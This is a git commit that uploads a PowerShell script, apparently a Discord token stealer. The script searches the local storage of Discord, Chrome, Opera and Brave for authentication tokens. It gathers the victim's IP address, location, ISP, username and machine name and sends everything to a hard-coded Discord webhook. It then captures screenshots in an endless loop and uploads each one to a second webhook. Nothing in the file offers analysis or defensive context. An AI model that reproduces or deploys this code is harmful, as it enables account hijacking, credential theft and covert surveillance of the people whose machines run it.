ebd980d9d404666a93d9298fb7af8c45e64307c7
ogdsposgdkgeso39 <lolsquid990@gmail.com>
2025-02-28 03:35:21 +0100

    Add files via upload

---
+++ squilliam.ps1
@@ -0,0 +1,88 @@
+[Reflection.Assembly]::LoadWithPartialName("System.Drawing")
+
+$uri = "https://discord.com/api/webhooks/1344840816601858201/L2dQrXYWVfUgQtjjtF9-04H64SoJcGFXzjzEvcVgCCUy4CZ00SS5molTpSpR3xkoadwJ"
+$ssuri = "https://discord.com/api/webhooks/1344765235680120952/gVjDPmjdYuEAtPi89wR17-ozx6Tqf-p7ymnheumSFxMelPTLWaQ7yOUOg6mkhiTAqb51"
+
+function Send {
+    param ($content)
+    $content = @{ "content" = $content; }
+    Invoke-WebRequest -uri $uri -Method POST -Body ($content | convertto-json) -Headers @{'Content-Type' = 'application/json'} -UseBasicParsing
+}
+
+function FindTokens {
+    param ($Path)
+    $tokens = ""
+    Get-ChildItem $Path -Recurse -Include ".ldb", ".log" | Foreach-Object {
+        $data = Get-Content $.FullName
+        foreach ($regex in [regex]'[\w-]{24}.[\w-]{6}.[\w-]{27}', [regex]'mfa.[\w-]{84}') {
+            ($regex).Matches($data) | ForEach-Object {
+                $tokens += $.Value + "n"
+            }
+            
+        }
+    }    
+    return $tokens
+}
+
+function GetInfo {
+    $resp = Invoke-WebRequest -UseBasicParsing -URI "http://ipinfo.io/json" | ConvertFrom-Json
+    $vpn = Invoke-WebRequest -UseBasicParsing -URI 'http://ip-api.com/json?fields=proxy' | ConvertFrom-Json
+    return "
+**IP**: $($resp.ip)
+**CITY**: $($resp.city)
+**REGION**: $($resp.region)
+**VPN**: $($vpn.proxy)
+**Inaccurate Location**: https://www.google.com/maps/search/google+map++$($resp.loc)
+**ISP**: $($resp.org)
+**TIMEZONE**: $($resp.timezone)
+**USERNAME**: $env:USERNAME 
+**USERPROFILE**: $env:USERPROFILE
+**COMPUTER NAME**: $env:COMPUTERNAME
+    "
+}
+
+function screenshot([Drawing.Rectangle]$bounds, $path) {
+   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
+   $graphics = [Drawing.Graphics]::FromImage($bmp)
+
+   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
+
+   $bmp.Save($path)
+
+   $graphics.Dispose()
+   $bmp.Dispose()
+}
+
+$local =  $env:LOCALAPPDATA
+$roaming = $env:APPDATA
+$paths = @(
+    $roaming + '\Discord'
+    $roaming + '\discordcanary'
+    $roaming + '\discordptb'
+    $local + '\Google\Chrome\User Data\Default'
+    $roaming + '\Opera Software\Opera Stable'
+    $local + '\BraveSoftware\Brave-Browser\User Data\Default'
+)
+
+$info = GetInfo
+$message = $info + '```Tokens:' + "n"
+
+foreach ($path in $paths) {
+    if (Test-Path -Path $path) {
+        $tokens = FindTokens -Path ($path + "\Local Storage\leveldb")
+        $message += $tokens + "`n"
+    }
+}
+
+
+$message += '```'
+Send -content $message
+
+$wc = New-Object System.Net.WebClient
+
+while (1) {
+    $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Width, [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Height)
+    screenshot $bounds "$env:LocalAppData\Temp\screenshot.jpg"
+    $path = "$env:LocalAppData\Temp\screenshot.jpg"
+    $resp = $wc.UploadFile($ssuri,$path)
+}
